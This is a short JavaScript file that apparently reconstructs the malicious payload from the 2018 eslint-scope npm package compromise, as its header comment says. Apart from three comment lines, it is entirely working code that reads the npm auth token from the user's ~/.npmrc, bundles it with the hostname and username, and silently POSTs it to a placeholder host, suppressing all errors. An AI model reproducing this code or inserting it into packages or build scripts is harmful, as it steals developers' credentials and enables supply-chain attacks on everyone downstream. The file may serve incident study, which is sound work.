// Reconstructed from the July 2018 eslint-scope compromise
// The original stole npm auth tokens from ~/.npmrc and sent them to histats.com
// All URLs replaced with safe example domains.

var https = require('https');
var fs = require('fs');
var os = require('os');
var path = require('path');

try {
  var npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
  var lines = npmrc.split('\n');
  var authToken = '';
  lines.forEach(function(line) {
    if (line.indexOf('_authToken') !== -1) {
      authToken = line.split('=')[1].trim();
    }
  });

  if (authToken) {
    var payload = JSON.stringify({
      token: authToken,
      host: os.hostname(),
      user: os.userInfo().username
    });

    var req = https.request({
      hostname: 'sstatic1.histats.example.com',
      port: 443,
      path: '/upload',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    });
    req.write(payload);
    req.end();
  }
} catch (e) {}
